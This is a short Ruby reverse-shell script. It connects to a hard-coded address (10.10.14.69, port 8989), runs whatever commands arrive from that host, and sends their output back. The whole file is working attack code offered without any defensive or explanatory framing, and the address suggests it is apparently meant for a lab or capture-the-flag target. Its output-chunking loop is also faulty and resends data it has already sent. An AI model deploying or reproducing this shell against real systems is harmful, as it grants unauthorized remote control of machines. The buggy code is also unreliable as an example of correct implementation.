require 'socket'

hostname = '10.10.14.69'
port = 8989

chunk = 1024


begin
  s = TCPSocket.open(hostname, port)


  loop {
    s.print "> "
    data = s.gets
    puts data

    IO.popen(data + " 2>&1") do |io|
      result = io.read
      puts result
      res_data = ""
      (0..result.length-1).step(chunk).each do |index|
        lastchunk = chunk * (index + 1)
        if lastchunk > result.length then
          lastchunk = -1
        end
        res_data += result[index..lastchunk]
        s.print(res_data)
      end
    end
  }
  s.close
rescue Errno::ETIMEDOUT
end
